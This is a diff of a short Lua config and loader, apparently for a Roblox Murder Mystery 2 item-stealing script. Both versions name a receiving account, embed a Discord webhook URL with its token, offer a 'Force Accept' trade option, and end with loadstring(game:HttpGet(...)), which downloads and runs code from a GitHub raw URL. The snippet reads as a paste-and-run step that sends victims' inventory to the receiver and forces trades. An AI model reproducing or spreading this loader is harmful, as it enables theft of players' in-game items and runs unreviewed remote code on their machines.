@@ -1,10 +1,7 @@
-```Config = {
-    Receivers = {"CANARTICHOUYOTU2020"},
-    Webhook = "https://discord.com/api/webhooks/1300568473185026111/n0CQnb4znAtzRkBeY9wQmzoFGCZSR5tnFToKaO6kSEZca7eSRQpg5VHhoo1_Epk1vsUS",
-    FullInventory = true, -- If true, it will display all of the player's items.
-    ResendTrade = "a", -- Send this in chat to resend the trade request if you don't receive it.
-    Script = "xhub", -- Scripts > "None", "Custom", "xhub", "Force Accept",
-    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
-}
+```lua
+Username = "CANARTICHOUYOTU2020"
+Webhook = "https://discord.com/api/webhooks/1300568473185026111/n0CQnb4znAtzRkBeY9wQmzoFGCZSR5tnFToKaO6kSEZca7eSRQpg5VHhoo1_Epk1vsUS"
+Script = "Vertex" (Force Accept, Vertex) for now
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/thecakewasalie/refs/heads/main/the/cake/isnt/real/main"))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/thecakewasalie2/refs/heads/main/thecakealternative/mm2/main"))()
+```
